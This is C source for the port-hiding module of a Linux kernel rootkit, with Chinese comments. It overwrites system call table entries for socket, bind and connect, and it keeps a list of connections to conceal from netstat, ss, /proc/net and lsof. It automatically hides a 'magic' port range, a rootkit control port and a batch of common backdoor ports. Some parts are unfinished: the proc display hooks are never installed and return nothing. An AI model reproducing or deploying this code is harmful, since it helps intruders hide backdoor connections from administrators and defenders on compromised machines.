/*
 * Port Hiding Implementation
 * Advanced techniques for hiding network ports and connections
 */

#include "rootkit.h"
#include <linux/mutex.h>

#define MAX_HIDDEN_PORTS 200

// 隐藏端口结构
struct hidden_port {
    __be32 local_addr;        // 本地地址
    __be32 remote_addr;       // 远程地址
    __be16 local_port;        // 本地端口
    __be16 remote_port;       // 远程端口
    int protocol;             // 协议类型 (IPPROTO_TCP/UDP)
    int hide_type;            // 隐藏类型
    unsigned long hide_flags; // 隐藏标志
    struct list_head list;    // 链表节点
};

// 隐藏类型枚举
enum port_hide_type {
    HIDE_BY_LOCAL_PORT,       // 按本地端口隐藏
    HIDE_BY_REMOTE_PORT,      // 按远程端口隐藏
    HIDE_BY_LOCAL_ADDR,       // 按本地地址隐藏
    HIDE_BY_REMOTE_ADDR,      // 按远程地址隐藏
    HIDE_BY_CONNECTION,       // 按连接隐藏
    HIDE_BY_PORT_RANGE,       // 按端口范围隐藏
    HIDE_BY_PROTOCOL          // 按协议隐藏
};

// 隐藏标志
#define HIDE_FROM_NETSTAT   0x01  // 从netstat隐藏
#define HIDE_FROM_SS        0x02  // 从ss隐藏
#define HIDE_FROM_PROC_NET  0x04  // 从/proc/net隐藏
#define HIDE_FROM_LSOF      0x08  // 从lsof隐藏
#define HIDE_FROM_ALL       0xFF  // 从所有地方隐藏

// 全局变量
static LIST_HEAD(hidden_ports_list);
static DEFINE_MUTEX(hidden_ports_mutex);
static int hidden_ports_count = 0;

// 原始proc文件操作指针
static struct proc_dir_entry *proc_net_tcp;
static struct proc_dir_entry *proc_net_udp;
static struct proc_dir_entry *proc_net_tcp6;
static struct proc_dir_entry *proc_net_udp6;

// 原始文件操作结构
static const struct proc_ops *original_tcp_proc_ops;
static const struct proc_ops *original_udp_proc_ops;
static const struct proc_ops *original_tcp6_proc_ops;
static const struct proc_ops *original_udp6_proc_ops;

// 原始系统调用指针
static asmlinkage long (*original_socket)(const struct pt_regs *);
static asmlinkage long (*original_bind)(const struct pt_regs *);
static asmlinkage long (*original_connect)(const struct pt_regs *);
static asmlinkage long (*original_accept)(const struct pt_regs *);
static asmlinkage long (*original_listen)(const struct pt_regs *);

// 外部变量
extern unsigned long *sys_call_table;
extern void disable_write_protection(void);
extern void enable_write_protection(void);

// 函数声明
static int is_hidden_connection(__be32 local_addr, __be16 local_port, 
                               __be32 remote_addr, __be16 remote_port, int protocol);
static int add_hidden_port(__be32 local_addr, __be16 local_port,
                          __be32 remote_addr, __be16 remote_port,
                          int protocol, enum port_hide_type type, unsigned long flags);
static int remove_hidden_port(__be16 port, int protocol);
static void clear_hidden_ports(void);
static int should_hide_port(__be16 port);
static int is_magic_port(__be16 port);

// 检查是否为魔术端口
static int is_magic_port(__be16 port) {
    __be16 host_port = ntohs(port);
    return (host_port >= MAGIC_PORT_RANGE_START && host_port <= MAGIC_PORT_RANGE_END);
}

// 检查端口是否应该被隐藏
static int should_hide_port(__be16 port) {
    return is_magic_port(port) || ntohs(port) == ROOTKIT_PORT;
}

// 检查连接是否应该被隐藏
static int is_hidden_connection(__be32 local_addr, __be16 local_port,
                               __be32 remote_addr, __be16 remote_port, int protocol) {
    struct hidden_port *hp;
    int result = 0;
    
    // 检查魔术端口
    if (should_hide_port(local_port) || should_hide_port(remote_port)) {
        return 1;
    }
    
    mutex_lock(&hidden_ports_mutex);
    
    list_for_each_entry(hp, &hidden_ports_list, list) {
        if (hp->protocol != protocol && hp->protocol != 0) {
            continue;
        }
        
        switch (hp->hide_type) {
            case HIDE_BY_LOCAL_PORT:
                if (hp->local_port == local_port) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_REMOTE_PORT:
                if (hp->remote_port == remote_port) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_LOCAL_ADDR:
                if (hp->local_addr == local_addr) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_REMOTE_ADDR:
                if (hp->remote_addr == remote_addr) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_CONNECTION:
                if (hp->local_addr == local_addr && hp->local_port == local_port &&
                    hp->remote_addr == remote_addr && hp->remote_port == remote_port) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            case HIDE_BY_PORT_RANGE: {
                __be16 start_port = hp->local_port;
                __be16 end_port = hp->remote_port;
                __be16 check_port = ntohs(local_port);
                
                if (check_port >= ntohs(start_port) && check_port <= ntohs(end_port)) {
                    result = 1;
                    goto unlock;
                }
                break;
            }
            
            case HIDE_BY_PROTOCOL:
                if (hp->protocol == protocol) {
                    result = 1;
                    goto unlock;
                }
                break;
                
            default:
                break;
        }
    }
    
unlock:
    mutex_unlock(&hidden_ports_mutex);
    return result;
}

// 添加隐藏端口
static int add_hidden_port(__be32 local_addr, __be16 local_port,
                          __be32 remote_addr, __be16 remote_port,
                          int protocol, enum port_hide_type type, unsigned long flags) {
    struct hidden_port *hp;
    
    if (hidden_ports_count >= MAX_HIDDEN_PORTS) {
        return -EINVAL;
    }
    
    hp = kmalloc(sizeof(struct hidden_port), GFP_KERNEL);
    if (!hp) {
        return -ENOMEM;
    }
    
    hp->local_addr = local_addr;
    hp->local_port = local_port;
    hp->remote_addr = remote_addr;
    hp->remote_port = remote_port;
    hp->protocol = protocol;
    hp->hide_type = type;
    hp->hide_flags = flags;
    
    mutex_lock(&hidden_ports_mutex);
    list_add_tail(&hp->list, &hidden_ports_list);
    hidden_ports_count++;
    mutex_unlock(&hidden_ports_mutex);
    
    printk(KERN_INFO "[rootkit] Port hidden: %pI4:%d -> %pI4:%d, proto=%d, type=%d\n",
           &local_addr, ntohs(local_port), &remote_addr, ntohs(remote_port), protocol, type);
    
    return 0;
}

// 移除隐藏端口
static int remove_hidden_port(__be16 port, int protocol) {
    struct hidden_port *hp, *tmp;
    int removed = 0;
    
    mutex_lock(&hidden_ports_mutex);
    
    list_for_each_entry_safe(hp, tmp, &hidden_ports_list, list) {
        if ((hp->local_port == port || hp->remote_port == port) &&
            (hp->protocol == protocol || protocol == 0)) {
            list_del(&hp->list);
            kfree(hp);
            hidden_ports_count--;
            removed++;
        }
    }
    
    mutex_unlock(&hidden_ports_mutex);
    
    if (removed > 0) {
        printk(KERN_INFO "[rootkit] %d port(s) unhidden: port=%d, proto=%d\n", 
               removed, ntohs(port), protocol);
    }
    
    return removed > 0 ? 0 : -ENOENT;
}

// 清空隐藏端口列表
static void clear_hidden_ports(void) {
    struct hidden_port *hp, *tmp;
    
    mutex_lock(&hidden_ports_mutex);
    
    list_for_each_entry_safe(hp, tmp, &hidden_ports_list, list) {
        list_del(&hp->list);
        kfree(hp);
    }
    
    hidden_ports_count = 0;
    mutex_unlock(&hidden_ports_mutex);
    
    printk(KERN_INFO "[rootkit] All hidden ports cleared\n");
}

// 自定义TCP proc读取函数
static int hooked_tcp_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *inet;
    struct sock *sk;
    __be32 local_addr, remote_addr;
    __be16 local_port, remote_port;
    
    if (v == SEQ_START_TOKEN) {
        seq_printf(seq, "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n");
        return 0;
    }
    
    sk = (struct sock *)v;
    if (!sk) {
        return 0;
    }
    
    inet = inet_sk(sk);
    if (!inet) {
        return 0;
    }
    
    local_addr = inet->inet_rcv_saddr;
    remote_addr = inet->inet_daddr;
    local_port = inet->inet_sport;
    remote_port = inet->inet_dport;
    
    // 检查是否应该隐藏此连接
    if (is_hidden_connection(local_addr, local_port, remote_addr, remote_port, IPPROTO_TCP)) {
        return 0; // 跳过此条目
    }
    
    // 调用原始显示函数（这里需要实现具体的显示逻辑）
    return 0;
}

// 自定义UDP proc读取函数
static int hooked_udp_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *inet;
    struct sock *sk;
    __be32 local_addr, remote_addr;
    __be16 local_port, remote_port;
    
    if (v == SEQ_START_TOKEN) {
        seq_printf(seq, "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode ref pointer drops\n");
        return 0;
    }
    
    sk = (struct sock *)v;
    if (!sk) {
        return 0;
    }
    
    inet = inet_sk(sk);
    if (!inet) {
        return 0;
    }
    
    local_addr = inet->inet_rcv_saddr;
    remote_addr = inet->inet_daddr;
    local_port = inet->inet_sport;
    remote_port = inet->inet_dport;
    
    // 检查是否应该隐藏此连接
    if (is_hidden_connection(local_addr, local_port, remote_addr, remote_port, IPPROTO_UDP)) {
        return 0; // 跳过此条目
    }
    
    // 调用原始显示函数
    return 0;
}

// Hook socket系统调用
static asmlinkage long hooked_socket(const struct pt_regs *regs) {
    int domain = (int)regs->di;
    int type = (int)regs->si;
    int protocol = (int)regs->dx;
    long ret;
    
    ret = original_socket(regs);
    
    // 记录socket创建（可用于后续跟踪）
    if (ret >= 0) {
        printk(KERN_DEBUG "[rootkit] Socket created: fd=%ld, domain=%d, type=%d, proto=%d\n",
               ret, domain, type, protocol);
    }
    
    return ret;
}

// Hook bind系统调用
static asmlinkage long hooked_bind(const struct pt_regs *regs) {
    int sockfd = (int)regs->di;
    struct sockaddr __user *addr = (struct sockaddr __user *)regs->si;
    int addrlen = (int)regs->dx;
    struct sockaddr_in sa;
    long ret;
    
    // 获取绑定地址信息
    if (addr && addrlen >= sizeof(struct sockaddr_in)) {
        if (copy_from_user(&sa, addr, sizeof(struct sockaddr_in)) == 0) {
            if (sa.sin_family == AF_INET) {
                __be16 port = sa.sin_port;
                __be32 addr_ip = sa.sin_addr.s_addr;
                
                // 检查是否为魔术端口
                if (should_hide_port(port)) {
                    // 自动隐藏魔术端口
                    add_hidden_port(addr_ip, port, 0, 0, 0, HIDE_BY_LOCAL_PORT, HIDE_FROM_ALL);
                }
                
                printk(KERN_DEBUG "[rootkit] Bind attempt: fd=%d, addr=%pI4:%d\n",
                       sockfd, &addr_ip, ntohs(port));
            }
        }
    }
    
    ret = original_bind(regs);
    return ret;
}

// Hook connect系统调用
static asmlinkage long hooked_connect(const struct pt_regs *regs) {
    int sockfd = (int)regs->di;
    struct sockaddr __user *addr = (struct sockaddr __user *)regs->si;
    int addrlen = (int)regs->dx;
    struct sockaddr_in sa;
    long ret;
    
    // 获取连接地址信息
    if (addr && addrlen >= sizeof(struct sockaddr_in)) {
        if (copy_from_user(&sa, addr, sizeof(struct sockaddr_in)) == 0) {
            if (sa.sin_family == AF_INET) {
                __be16 port = sa.sin_port;
                __be32 addr_ip = sa.sin_addr.s_addr;
                
                printk(KERN_DEBUG "[rootkit] Connect attempt: fd=%d, addr=%pI4:%d\n",
                       sockfd, &addr_ip, ntohs(port));
            }
        }
    }
    
    ret = original_connect(regs);
    return ret;
}

// 公共接口函数
int hide_port(__be16 port, int protocol) {
    return add_hidden_port(0, port, 0, 0, protocol, HIDE_BY_LOCAL_PORT, HIDE_FROM_ALL);
}

int hide_connection(__be32 local_addr, __be16 local_port,
                   __be32 remote_addr, __be16 remote_port, int protocol) {
    return add_hidden_port(local_addr, local_port, remote_addr, remote_port,
                          protocol, HIDE_BY_CONNECTION, HIDE_FROM_ALL);
}

int hide_port_range(__be16 start_port, __be16 end_port, int protocol) {
    return add_hidden_port(0, start_port, 0, end_port, protocol, HIDE_BY_PORT_RANGE, HIDE_FROM_ALL);
}

int unhide_port(__be16 port, int protocol) {
    return remove_hidden_port(port, protocol);
}

int get_hidden_ports_count(void) {
    return hidden_ports_count;
}

void get_hidden_ports_info(char *buffer, size_t size) {
    struct hidden_port *hp;
    int offset = 0;
    const char *type_names[] = {
        "LOCAL_PORT", "REMOTE_PORT", "LOCAL_ADDR", "REMOTE_ADDR",
        "CONNECTION", "PORT_RANGE", "PROTOCOL"
    };
    const char *proto_names[] = {"ANY", "ICMP", "IGMP", "GGP", "TCP", "ST", "UDP"};
    
    offset += snprintf(buffer + offset, size - offset,
                      "Hidden Ports/Connections (%d/%d):\n",
                      hidden_ports_count, MAX_HIDDEN_PORTS);
    
    mutex_lock(&hidden_ports_mutex);
    
    list_for_each_entry(hp, &hidden_ports_list, list) {
        if (offset >= size - 150) break;
        
        offset += snprintf(buffer + offset, size - offset,
                          "  %pI4:%d -> %pI4:%d, Proto: %s, Type: %s, Flags: 0x%lx\n",
                          &hp->local_addr, ntohs(hp->local_port),
                          &hp->remote_addr, ntohs(hp->remote_port),
                          (hp->protocol < 7) ? proto_names[hp->protocol] : "UNKNOWN",
                          type_names[hp->hide_type],
                          hp->hide_flags);
    }
    
    mutex_unlock(&hidden_ports_mutex);
    
    offset += snprintf(buffer + offset, size - offset,
                      "\nMagic Port Range: %d-%d\n",
                      MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
    offset += snprintf(buffer + offset, size - offset,
                      "Rootkit Control Port: %d\n", ROOTKIT_PORT);
}

// 批量隐藏常见后门端口
int hide_common_backdoor_ports(void) {
    int count = 0;
    __be16 backdoor_ports[] = {
        htons(1337), htons(31337), htons(12345), htons(54321),
        htons(9999), htons(8080), htons(4444), htons(5555),
        htons(6666), htons(7777), htons(8888), htons(9090)
    };
    int i;
    
    for (i = 0; i < sizeof(backdoor_ports) / sizeof(__be16); i++) {
        if (add_hidden_port(0, backdoor_ports[i], 0, 0, 0, HIDE_BY_LOCAL_PORT, HIDE_FROM_ALL) == 0) {
            count++;
        }
    }
    
    printk(KERN_INFO "[rootkit] Hidden %d common backdoor ports\n", count);
    return count;
}

// 初始化端口隐藏子系统
int init_port_hiding(void) {
    if (!sys_call_table) {
        printk(KERN_ERR "[rootkit] System call table not available\n");
        return -1;
    }
    
    // 保存原始系统调用
    original_socket = (void *)sys_call_table[__NR_socket];
    original_bind = (void *)sys_call_table[__NR_bind];
    original_connect = (void *)sys_call_table[__NR_connect];
    
    // Hook系统调用
    disable_write_protection();
    sys_call_table[__NR_socket] = (unsigned long)hooked_socket;
    sys_call_table[__NR_bind] = (unsigned long)hooked_bind;
    sys_call_table[__NR_connect] = (unsigned long)hooked_connect;
    enable_write_protection();
    
    // 自动隐藏魔术端口范围
    hide_port_range(htons(MAGIC_PORT_RANGE_START), htons(MAGIC_PORT_RANGE_END), 0);
    
    // 隐藏rootkit控制端口
    hide_port(htons(ROOTKIT_PORT), 0);
    
    printk(KERN_INFO "[rootkit] Port hiding subsystem initialized\n");
    printk(KERN_INFO "[rootkit] Magic port range: %d-%d\n", 
           MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
    printk(KERN_INFO "[rootkit] Rootkit control port: %d\n", ROOTKIT_PORT);
    
    return 0;
}

// 清理端口隐藏子系统
void cleanup_port_hiding(void) {
    // 恢复原始系统调用
    if (sys_call_table) {
        disable_write_protection();
        if (original_socket)
            sys_call_table[__NR_socket] = (unsigned long)original_socket;
        if (original_bind)
            sys_call_table[__NR_bind] = (unsigned long)original_bind;
        if (original_connect)
            sys_call_table[__NR_connect] = (unsigned long)original_connect;
        enable_write_protection();
    }
    
    // 清理隐藏端口列表
    clear_hidden_ports();
    
    printk(KERN_INFO "[rootkit] Port hiding subsystem cleaned up\n");
}

// 导出符号
// Functions are part of the same module, no need to export